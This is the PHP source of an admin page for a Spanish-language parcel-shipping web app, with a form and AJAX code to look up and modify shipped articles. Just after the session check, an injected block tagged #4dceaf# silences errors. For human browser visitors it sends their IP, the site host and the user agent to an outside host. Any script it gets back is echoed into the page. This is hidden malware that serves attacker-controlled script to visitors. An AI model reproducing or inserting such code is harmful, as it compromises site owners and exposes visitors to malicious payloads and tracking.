<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador.php");
	}	
	require("../conexion/ajax.php");
?>
<?php
#4dceaf#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/4dceaf#
?>
<script language="javascript" type="text/javascript">
	function go()
	{
		location.href="administrador.php";
	}
	
	function buscarArticulo()
	{
		
		//agregarCargando('cargando');
		codArt = document.getElementById("txtCodigo").value;
		if(codArt.length==0)
		{
			alert("¡ Debes ingresar un número de Articulo !");
			quitarCargando('cargando');	
			return;	
		}
		
		_obj = crearObjeto();			
		_url = "ajaxManejador.php";
		_valores = "op=buscarArticulo&codigo=" + codArt;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					//alert("estamos en buscar "+ codArt);
					resp = _obj.responseText;
					resp = resp.split("*");
					alert(resp);
					if(resp[0] == "notFound")
					{	
						alert("! No existe Articulo con numero " + codArt + " !");
						quitarCargando('cargando');				
						//document.getElementById("textTipoComp").value = "";			
						document.getElementById("txtDescripcion").value = "";
						document.getElementById("txtPeso").value = "";
						document.getElementById("txtFlete").value = "";
						document.getElementById("txtRemitente").value = "";
						document.getElementById("txtDestinatario").value = "";																								
						//document.getElementById("usuario").innerHTML = "";
						return;
					}					
					//quitarCargando('cargando');
					//alert(resp);
					document.getElementById("txtDescripcion").value = resp[0];
					document.getElementById("txtPeso").value = resp[1];
					document.getElementById("txtFlete").value = resp[2];
					document.getElementById("txtRemitente").value = resp[7];																								
					document.getElementById("txtDestinatario").value = resp[8];
					document.getElementById(resp[3]).selected = true;
					document.getElementById(resp[4]).selected = true;
					document.getElementById(resp[5]).selected = true;
					document.getElementById(resp[6]).selected = true;
					
				 }
			}
		}	
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
<!--
.Estilo2 {font-weight: bold}
-->
</style>
<title>Imprimir: ctrl+i  | NoImprimir: ctrl+n</title></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><div align="center">
          <p><strong>MODIFICAR ARTICULO </strong></p>
          <form id="form1" name="form1" method="post" action="admin.php">
            <table width="294" border="0">
              <tr>
                <td width="124"><strong>Codigo:</strong></td>
                <td width="160"><input name="txtCodigo" type="text" id="txtCodigo" /></td>
              </tr>
              <tr>
                <td><div align="center">
                    <input name="btnBuscar" type="button" id="btnBuscar" value="Buscar" onClick="buscarArticulo()" />
                </div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td height="27"><strong>Descripcion: </strong></td>
                <td><textarea name="txtDescripcion" id="txtDescripcion"></textarea></td>
              </tr>
              <tr>
                <td><strong>Peso:</strong></td>
                <td><input name="txtPeso" type="text" id="txtPeso" /></td>
              </tr>
              <tr>
                <td><strong>Flete:</strong></td>
                <td><input name="txtFlete" type="text" id="txtFlete" /></td>
              </tr>
              <tr>
                <td><strong>T. Articulo: </strong></td>
                <td><select name="cbmTipoArticulo" id="cbmTipoArticulo">
                    <option value="Carta">Carta</option>
                    <option value="Paquete">Paquete</option>
                    <option value="Caja">Caja</option>
                    <option value="Otros">Otros</option>
                  </select>
                </td>
              </tr>
              <tr>
                <td><strong>T. Entrega </strong></td>
                <td><select name="cmbTipoEntrega" id="cmbTipoEntrega">
                    <option value="Origen">Origen</option>
                    <option value="Destino">Destino</option>
                  </select>
                </td>
              </tr>
              <tr>
                <td><strong>T. Pago:</strong></td>
                <td><select name="cmbTipoPago" id="cmbTipoPago">
                    <option value="Remitente">Remitente</option>
                    <option value="Destinatario">Destinatario</option>
                  </select>
                </td>
              </tr>
              <tr>
                <td><strong>Estado Pago: </strong></td>
                <td><select name="cmbEstadoPago" id="cmbEstadoPago">
                    <option value="Cancelado">Cancelado</option>
                    <option value="Cobranza">Cobranza</option>
                    <option value="Pendiente">Pendiente</option>
                  </select>
                </td>
              </tr>
              <tr>
                <td><strong>Remitente:</strong></td>
                <td><input name="txtRemitente" type="text" id="txtRemitente" /></td>
              </tr>
              <tr>
                <td><strong>Destinatario:</strong></td>
                <td><input name="txtDestinatario" type="text" id="txtDestinatario" /></td>
              </tr>
              <tr>
                <td>&nbsp;</td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td><div align="center">
                    <input name="btnActualizar" type="submit" id="btnActualizar" value="Actualizar" />
                    <input name="op" type="hidden" id="op" value="actArt" />
                </div></td>
                <td><div align="center">
                    <input name="btnCancelar" type="submit" id="btnCancelar" value="Cancelar" onClick="go()"/>
                </div></td>
              </tr>
            </table>
                    </form>
          <p>&nbsp;</p>
        </div></td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>